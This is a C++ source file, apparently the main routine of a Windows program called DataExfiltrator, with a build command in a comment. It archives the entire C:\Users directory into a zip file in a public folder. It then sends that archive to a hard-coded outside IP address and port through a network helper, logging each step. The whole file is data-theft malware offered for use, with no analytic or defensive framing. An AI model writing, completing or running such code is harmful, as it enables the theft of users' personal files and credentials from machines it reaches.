#include <iostream>
#include "FileHandler.h"
#include "NetworkHandler.h"

// g++ -o DataExfiltrator.exe *.cpp -Iinclude -lws2_32 -static-libstdc++ -static-libgcc

int main() {
    std::cout << "[INFO] Starting data exfiltration process..." << std::endl;

    std::string directoryPath = "C:\\Users";
    std::string zipPath = "C:\\Users\\Public\\Downloads\\shiti.zip";

    // Step 1: Create ZIP Archive
    std::cout << "[INFO] Creating ZIP archive from directory: " << directoryPath << std::endl;
    std::string archive = FileHandler::CreateZipArchive(directoryPath, zipPath);

    if (!archive.empty()) {
        std::cout << "[INFO] ZIP archive created successfully: " << archive << std::endl;

        // Step 2: Exfiltrate Data
        std::string targetIP = "64.95.10.101";
        int targetPort = 8080;
        std::cout << "[INFO] Attempting to exfiltrate data to " << targetIP << ":" << targetPort << std::endl;

        if (NetworkHandler::ExfiltrateData(archive, targetIP, targetPort)) {
            std::cout << "[SUCCESS] Data exfiltration complete." << std::endl;
        } else {
            std::cerr << "[ERROR] Data exfiltration failed." << std::endl;
        }
    } else {
        std::cerr << "[ERROR] No data found to exfiltrate. Failed to create ZIP archive." << std::endl;
    }

    std::cout << "[INFO] Data exfiltration process finished." << std::endl;
    return 0;
}
